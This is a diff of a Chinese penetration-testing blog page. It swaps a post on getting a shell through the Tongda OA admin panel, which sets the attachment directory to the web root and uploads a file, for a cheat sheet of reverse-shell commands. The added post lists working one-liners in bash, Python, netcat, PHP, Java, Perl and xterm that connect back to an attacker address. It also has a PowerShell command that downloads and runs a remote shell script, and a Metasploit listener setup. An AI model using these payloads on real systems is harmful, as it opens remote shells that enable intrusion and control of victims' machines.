@@ -22,33 +22,19 @@
     var CONFIG = {"hostname":"yoursite.com","root":"/","scheme":"Gemini","version":"7.7.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta name="description" content="0x01 如何后台怎么进入后台随便你，可以利用前段时间的任意用户登录漏洞">
+  <meta name="description" content="常见反向shell生成与使用方法：​    如果目标存在命令&#x2F;代码执行漏洞，可用此些方法获取shell。 Bash：​    Attacker：nc  -lvvp  4444 ​    Victimer： 1bash -i  &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;Attacker_IP&#x2F;4444  0&gt;&amp;1    Python：​    Attacker：nc  -lvvp  444">
 <meta property="og:type" content="article">
-<meta property="og:title" content="通达OA 后台GetShell">
-<meta property="og:url" content="http://yoursite.com/2020/%E9%80%9A%E8%BE%BEOA3.html">
+<meta property="og:title" content="常见反向shell方法">
+<meta property="og:url" content="http://yoursite.com/2020/%E5%B8%B8%E7%94%A8%E5%8F%8D%E5%90%91shell.html">
 <meta property="og:site_name" content="TBOsec的网络日志">
-<meta property="og:description" content="0x01 如何后台怎么进入后台随便你，可以利用前段时间的任意用户登录漏洞">
+<meta property="og:description" content="常见反向shell生成与使用方法：​    如果目标存在命令&#x2F;代码执行漏洞，可用此些方法获取shell。 Bash：​    Attacker：nc  -lvvp  4444 ​    Victimer： 1bash -i  &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;Attacker_IP&#x2F;4444  0&gt;&amp;1    Python：​    Attacker：nc  -lvvp  444">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://yoursite.com/images/upload/loginadmin.png">
-<meta property="og:image" content="http://yoursite.com/images/upload/fujian.png">
-<meta property="og:image" content="http://yoursite.com/images/upload/fujian2.png">
-<meta property="og:image" content="http://yoursite.com/images/upload/fujian3.png">
-<meta property="og:image" content="http://yoursite.com/images/upload/fujian4.png">
-<meta property="og:image" content="http://yoursite.com/images/upload/fujian5.png">
-<meta property="og:image" content="http://yoursite.com/images/upload/fujian6.png">
-<meta property="og:image" content="http://yoursite.com/images/upload/oa31.png">
-<meta property="og:image" content="http://yoursite.com/images/upload/oa3.png">
-<meta property="og:image" content="http://yoursite.com/images/upload/oa32.png">
-<meta property="og:image" content="http://yoursite.com/images/upload/oa33.png">
-<meta property="og:image" content="http://yoursite.com/images/upload/oa34.png">
-<meta property="article:published_time" content="2020-05-16T11:12:20.000Z">
-<meta property="article:modified_time" content="2020-05-16T12:53:44.582Z">
+<meta property="article:published_time" content="2020-07-09T07:55:34.000Z">
+<meta property="article:modified_time" content="2020-07-09T07:57:22.255Z">
 <meta property="article:author" content="TBOsec">
-<meta property="article:tag" content="漏洞复现">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://yoursite.com/images/upload/loginadmin.png">
 
-<link rel="canonical" href="http://yoursite.com/2020/%E9%80%9A%E8%BE%BEOA3.html">
+<link rel="canonical" href="http://yoursite.com/2020/%E5%B8%B8%E7%94%A8%E5%8F%8D%E5%90%91shell.html">
 
 
 <script id="page-configurations">
@@ -60,7 +46,7 @@
   };
 </script>
 
-  <title>通达OA 后台GetShell | TBOsec的网络日志</title>
+  <title>常见反向shell方法 | TBOsec的网络日志</title>
   
 
 
@@ -201,7 +187,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/%E9%80%9A%E8%BE%BEOA3.html">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/%E5%B8%B8%E7%94%A8%E5%8F%8D%E5%90%91shell.html">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.jpg">
@@ -214,7 +200,7 @@
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
-          通达OA 后台GetShell
+          常见反向shell方法
         </h2>
 
         <div class="post-meta">
@@ -224,7 +210,7 @@
               </span>
               <span class="post-meta-item-text">发表于</span>
 
-              <time title="创建时间：2020-05-16 19:12:20" itemprop="dateCreated datePublished" datetime="2020-05-16T19:12:20+08:00">2020-05-16</time>
+              <time title="创建时间：2020-07-09 15:55:34" itemprop="dateCreated datePublished" datetime="2020-07-09T15:55:34+08:00">2020-07-09</time>
             </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -232,7 +218,7 @@
               </span>
               <span class="post-meta-item-text">分类于</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E9%80%9A%E8%BE%BEOA/" itemprop="url" rel="index"><span itemprop="name">通达OA</span></a>
+                  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
                 </span>
             </span>
 
@@ -247,28 +233,50 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h3 id="0x01-如何后台"><a href="#0x01-如何后台" class="headerlink" title="0x01 如何后台"></a>0x01 如何后台</h3><p>怎么进入后台随便你，可以利用前段时间的<code>任意用户登录漏洞</code></p>
-<p><img src="../images/upload/loginadmin.png" alt="login"></p>
-<a id="more"></a>
+        <h2 id="常见反向shell生成与使用方法："><a href="#常见反向shell生成与使用方法：" class="headerlink" title="常见反向shell生成与使用方法："></a>常见反向shell生成与使用方法：</h2><p>​    如果目标存在命令/代码执行漏洞，可用此些方法获取shell。</p>
+<h3 id="Bash："><a href="#Bash：" class="headerlink" title="Bash："></a>Bash：</h3><p>​    Attacker：nc  -lvvp  4444</p>
+<p>​    Victimer：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i  &gt;&amp; /dev/tcp/Attacker_IP/4444  0&gt;&amp;1</span><br></pre></td></tr></table></figure>
 
-<h3 id="0x02-更改配置"><a href="#0x02-更改配置" class="headerlink" title="0x02 更改配置"></a>0x02 更改配置</h3><p>此处利用系统管理-&gt;附件管理📎</p>
-<p><img src="../images/upload/fujian.png" alt="fujian"></p>
-<p>此站点并未设置存储目录，点击添加目录</p>
-<p><img src="../images/upload/fujian2.png" alt="fujian"></p>
-<p>目录中要设置网站根目录，根目录可以通过系统管理-&gt;系统信息处获得</p>
-<p><img src="../images/upload/fujian3.png" alt="gujian3"></p>
-<p><img src="../images/upload/fujian4.png" alt="fujian4"></p>
-<p>记得勾选<code>将所有新附件存该目录</code>，然后保存</p>
-<p><img src="../images/upload/fujian5.png" alt="fujian5"></p>
-<h3 id="0x03-上传附件"><a href="#0x03-上传附件" class="headerlink" title="0x03 上传附件"></a>0x03 上传附件</h3><p>通过组织下的聊天框，选中自己后发送任意附件，利用BurpSuite拦截</p>
-<p><img src="../images/upload/fujian6.png" alt="fujian6"></p>
-<p><img src="../images/upload/oa31.png" alt="oa31"></p>
-<p><a href="../file/upshell.txt">上传附件 request.txt</a></p>
-<p><img src="../images/upload/oa3.png" alt="oa3"></p>
-<p><img src="../images/upload/oa32.png" alt="oa32"></p>
-<p><img src="../images/upload/oa33.png" alt="oa33"></p>
-<p><img src="../images/upload/oa34.png" alt="oa34"></p>
 
+
+<h3 id="Python："><a href="#Python：" class="headerlink" title="Python："></a>Python：</h3><p>​    Attacker：nc  -lvvp  4444</p>
+<p>​    Victimer：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.16.1.130",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Netcat-nc-："><a href="#Netcat-nc-：" class="headerlink" title="Netcat(nc)："></a>Netcat(nc)：</h3><p>​    如果目标机器存在nc且有-e参数，那么可以使用nc建立反向shell</p>
+<p>​    Attacker：nc  -lvvp 4444</p>
+<p>​    Victimer：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e  /bin/bash  Attacker_IP 4444</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><p>​    Attacker：nc  -lvvp 4444</p>
+<p>​    Victimer：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">'$sock=fsockopen("172.16.1.130",4444);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Java："><a href="#Java：" class="headerlink" title="Java："></a>Java：</h3><p>​    Attacker：nc  -lvvp 4444</p>
+<p>​    Victimer ：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">r = Runtime.getRuntime()</span><br><span class="line">p = r.exec([<span class="string">"/bin/bash"</span>,<span class="string">"-c"</span>,<span class="string">"exec 5&lt;&gt;/dev/tcp/172.16.1.130/4444;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done"</span>] as String[])</span><br><span class="line">p.waitFor()</span><br></pre></td></tr></table></figure>
+
+<h3 id="Perl："><a href="#Perl：" class="headerlink" title="Perl："></a>Perl：</h3><p>​    Attacker：nc  -lvvp 4444</p>
+<p>​    Victimer：</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e <span class="string">'use Socket;$i="172.16.1.130";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");&#125;;'</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Powershell："><a href="#Powershell：" class="headerlink" title="Powershell："></a>Powershell：</h3><p>​    Attacker：nc  -lvvp 4444</p>
+<p>​    Victimer：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell IEX (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">'https://raw.githubusercontent.com/samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellTcp.ps1'</span>);<span class="built_in">Invoke-PowerShellTcp</span> <span class="literal">-Reverse</span> <span class="literal">-IPAddress</span> <span class="number">172.16</span>.<span class="number">1.130</span> <span class="literal">-port</span> <span class="number">4444</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Xterm："><a href="#Xterm：" class="headerlink" title="Xterm："></a>Xterm：</h3><p>​    Victimer:  </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xterm -display Attacker_IP:1</span><br></pre></td></tr></table></figure>
+
+<p>​    Attacker:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Xnest :1</span><br><span class="line">xhost +Victimer_IP</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="Msfvenom连接一句话："><a href="#Msfvenom连接一句话：" class="headerlink" title="Msfvenom连接一句话："></a>Msfvenom连接一句话：</h3><p>msf支持多种反弹方式，比如exe ps php asp aspx甚至是ruby等，我们可以用msfvenom来生成payload，然后在msf中监听，执行之后就会反弹回来session。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> PAYLOAD windows/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> LHOST 172.16.1.130</span><br><span class="line"><span class="built_in">set</span> LPORT 4444</span><br><span class="line"><span class="built_in">set</span> ExitOnSession <span class="literal">false</span></span><br><span class="line">exploit -j -z</span><br></pre></td></tr></table></figure>
     </div>
 
     
@@ -320,9 +328,6 @@
 
 
       <footer class="post-footer">
-          <div class="post-tags">
-              <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="tag"># 漏洞复现</a>
-          </div>
 
         
 
@@ -330,13 +335,10 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/2020/%E9%80%9A%E8%BE%BEOA2.html" rel="prev" title="通达OA 任意文件上传/文件包含GetShell">
-      <i class="fa fa-chevron-left"></i> 通达OA 任意文件上传/文件包含GetShell
+    <a href="/2020/xss%E8%8E%B7%E5%8F%96.html" rel="prev" title="简易xss平台 获取Cookie">
+      <i class="fa fa-chevron-left"></i> 简易xss平台 获取Cookie
     </a></div>
-      <div class="post-nav-item">
-    <a href="/2020/linux%E7%89%88%E6%9C%AC.html" rel="next" title="linux 查看硬件架构|系统版本|内核版本">
-      linux 查看硬件架构|系统版本|内核版本 <i class="fa fa-chevron-right"></i>
-    </a></div>
+      <div class="post-nav-item"></div>
     </div>
       </footer>
     
@@ -396,7 +398,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-如何后台"><span class="nav-text">0x01 如何后台</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-更改配置"><span class="nav-text">0x02 更改配置</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-上传附件"><span class="nav-text">0x03 上传附件</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#常见反向shell生成与使用方法："><span class="nav-text">常见反向shell生成与使用方法：</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Bash："><span class="nav-text">Bash：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Python："><span class="nav-text">Python：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Netcat-nc-："><span class="nav-text">Netcat(nc)：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PHP"><span class="nav-text">PHP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Java："><span class="nav-text">Java：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Perl："><span class="nav-text">Perl：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Powershell："><span class="nav-text">Powershell：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Xterm："><span class="nav-text">Xterm：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Msfvenom连接一句话："><span class="nav-text">Msfvenom连接一句话：</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
